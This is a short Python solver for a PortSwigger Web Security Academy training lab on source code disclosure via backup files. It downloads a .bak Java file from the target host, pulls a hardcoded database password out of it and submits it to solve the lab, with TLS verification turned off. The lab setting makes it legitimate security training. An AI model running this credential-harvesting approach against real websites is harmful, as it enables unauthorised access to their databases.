#!/usr/bin/env python3
# Lab: Source code disclosure via backup files
# Lab-Link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files
# Difficulty: APPRENTICE
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    key = None
    r = requests.get(f'{host}/backup/ProductTemplate.java.bak', verify=False, proxies=proxies)
    lines = r.text.split('\n')
    for idx, line in enumerate(lines):
        if ').withAutoCommit();' in line:
            key = lines[idx - 1].strip().strip('"')
            break

    if key is None:
        print(f'[-] Failed to find database password')
        sys.exit(-2)
    print(f'[+] database password found: {key}')

    data = {'answer': key}
    r = requests.post(f'{host}/submitSolution', data=data, verify=False, proxies=proxies)
    if '{"correct":true}' in r.text:
        print(f'[+] Correct version sumbitted, lab solved')
    else:
        print(f'[-] Failed to solve lab')


if __name__ == "__main__":
    main()
